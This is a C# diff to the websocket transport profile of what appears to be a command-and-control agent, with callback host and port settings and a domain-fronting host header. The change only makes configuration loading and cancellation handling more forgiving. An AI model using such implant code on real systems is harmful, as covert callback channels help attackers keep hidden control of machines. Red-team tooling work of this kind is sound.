@@ -35,11 +35,19 @@ namespace Agent.Profiles.Websocket
             this.crypt = crypto;
             this.logger = logger;
             this.messageManager = messageManager;
-            var opts = JsonSerializer.Deserialize(
-                ChannelConfig.Decode(),
-                WebsocketChannelOptionsJsonContext.Default.WebsocketChannelOptions)
-                ?? throw new InvalidOperationException("Invalid Websocket profile configuration");
-            this.endpoint = opts.Endpoint;
+            WebsocketChannelOptions? opts = null;
+            try
+            {
+                opts = JsonSerializer.Deserialize(
+                    ChannelConfig.Decode(),
+                    WebsocketChannelOptionsJsonContext.Default.WebsocketChannelOptions);
+            }
+            catch (Exception ex)
+            {
+                this.logger.Log($"Failed to deserialize Websocket channel options: {ex.Message}");
+            }
+            opts ??= new WebsocketChannelOptions();
+            this.endpoint = opts.Endpoint ?? string.Empty;
             this.url = $"{opts.CallbackHost}:{opts.CallbackPort}/{this.endpoint}";
             this.userAgent = opts.UserAgent;
             this.hostHeader = opts.DomainFront;
@@ -219,7 +227,7 @@ namespace Agent.Profiles.Websocket
             catch (OperationCanceledException)
             {
                 ObserveFault(operation);
-                throw;
+                return false;
             }
         }
 
